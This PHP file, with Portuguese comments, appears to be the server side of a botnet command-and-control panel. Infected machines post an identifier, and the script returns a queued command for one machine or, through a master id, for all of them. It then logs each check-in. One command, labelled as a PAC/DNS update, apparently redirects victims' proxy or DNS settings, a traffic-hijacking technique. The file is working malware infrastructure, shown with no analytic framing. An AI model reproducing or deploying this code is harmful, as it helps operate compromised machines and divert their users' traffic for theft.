<?php
error_reporting(0);
// 0xf2ad8391c8c6903848c967366338b9df
if(isset($_POST["87324"])){
	
	// Carrega INI's...
	$cCMDDatabase = parse_ini_file("databases/cmd.ini", "UID");
	$UID = $cCMDDatabase["UID"]["UID"];
	$MASTER = $cCMDDatabase["UID"]["MASTER"];
	$POSTX = $_POST["87324"];
	
	if(strcmp($UID, $POSTX) == 0){
		// Comando para esta máquina
		printf($cCMDDatabase["CMD"]["CMD"]);
		
		$buf = "[UID]\nUID=\nMASTER=\n\n[CMD]\nCMD=";
		$arq = fopen("databases/cmd.ini", "w");
		$grx = fwrite($arq, $buf);
		fclose($arq);
		
		$bufLOG = "UID: ". $_POST["87324"] ." - DATA: ". date("d/m/Y H:i:s ") ." - CMD: ". $cCMDDatabase["CMD"]["CMD"] ."\n";
		$arqLOG = fopen("acessos/maquinas/access_log.txt", "a+");
		$arqGRV = fwrite($arqLOG, $bufLOG);
		fclose($arqLOG);
		
		exit(0);
	}
	
	if(strcmp($MASTER, $POSTX) == 0){
		// Comando para todas as máquina
		printf($cCMDDatabase["CMD"]["CMD"]);
		
		$buf = "[UID]\nUID=\nMASTER=\n\n[CMD]\nCMD=";
		$arq = fopen("databases/cmd.ini", "w");
		$grx = fwrite($arq, $buf);
		fclose($arq);
		
		$bufLOG = "UID: ". $_POST["87324"] ." - DATA: ". date("d/m/Y H:i:s ") ." - CMD: ". $cCMDDatabase["CMD"]["CMD"] ."\n";
		$arqLOG = fopen("acessos/maquinas/access_log.txt", "a+");
		$arqGRV = fwrite($arqLOG, $bufLOG);
		fclose($arqLOG);
		
		exit(0);
	}
	
	if(strcmp($cCMDDatabase["CMD"]["CMD"], "DNSCP") == 0){
		// Atualizar PAC / DNS
		printf("DNSCP");
		
		$buf = "[UID]\nUID=\nMASTER=\n\n[CMD]\nCMD=";
		$arq = fopen("databases/cmd.ini", "w");
		$grx = fwrite($arq, $buf);
		fclose($arq);
		
		$bufLOG = "UID: ". $_POST["87324"] ." - DATA: ". date("d/m/Y H:i:s ") ." - CMD: ". $cCMDDatabase["CMD"]["CMD"] ."\n";
		$arqLOG = fopen("acessos/maquinas/access_log.txt", "a+");
		$arqGRV = fwrite($arqLOG, $bufLOG);
		fclose($arqLOG);
		
		exit(0);
	}
	
	printf("Exit");
	
	$bufl = "[UID]\nUID=\nMASTER=\n\n[CMD]\nCMD=";
	$arql = fopen("databases/cmd.ini", "w");
	$grxl = fwrite($arql, $bufl);
	fclose($arq);
	
	$bufLOG = "UID: ". $_POST["87324"] ." - DATA: ". date("d/m/Y H:i:s ") ."\n";
	$arqLOG = fopen("acessos/maquinas/access_log.txt", "a+");
	$arqGRV = fwrite($arqLOG, $bufLOG);
	fclose($arqLOG);
}
?>
